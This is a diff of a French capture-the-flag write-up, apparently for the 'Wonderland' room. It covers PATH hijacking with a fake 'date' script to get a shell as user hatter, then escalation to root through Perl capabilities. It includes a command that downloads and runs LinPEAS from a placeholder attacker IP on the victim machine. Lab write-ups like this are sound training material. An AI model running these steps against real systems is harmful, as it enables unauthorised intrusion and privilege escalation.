@@ -62,21 +62,24 @@ Nous modifions la variable `$PATH` pour inclure notre dossier actuel (`/home/rab
 
 ```bash
 export PATH=/home/rabbit:$PATH
+```
 
-/home/rabbit : Le dossier où se trouve notre faux script "date".
+* `/home/rabbit` : Le dossier où se trouve notre faux script "date".
+* `:$PATH` : Ajoute le chemin existant à la suite.
 
-:$PATH : Ajoute le chemin existant à la suite.
-
-En relançant `./teaParty`, le binaire exécute notre faux script date avec les droits de hatter. Nous obtenons un shell pour l'utilisateur hatter.
+En relançant `./teaParty`, le binaire exécute notre faux script `date` avec les droits de `hatter`. Nous obtenons un shell pour l'utilisateur `hatter`.
 
 ## 👑 4. Escalade de Privilèges : Hatter vers Root
 *(Technique : Linux Capabilities)*
 
-Une fois connecté en tant que hatter, nous transférons et exécutons LinPEAS pour scanner le système.
+Une fois connecté en tant que `hatter`, nous transférons et exécutons **LinPEAS** pour scanner le système.
+
+```bash
 python3 -m http.server # Sur la machine attaquante
 wget http://IP_ATTAQUANT:8000/linpeas.sh # Sur la victime
 chmod +x linpeas.sh
 ./linpeas.sh
+```
 LinPEAS identifie que l'interpréteur Perl possède des "capabilities" étendues (cap_setuid+ep).
 
 Explication de la vulnérabilité
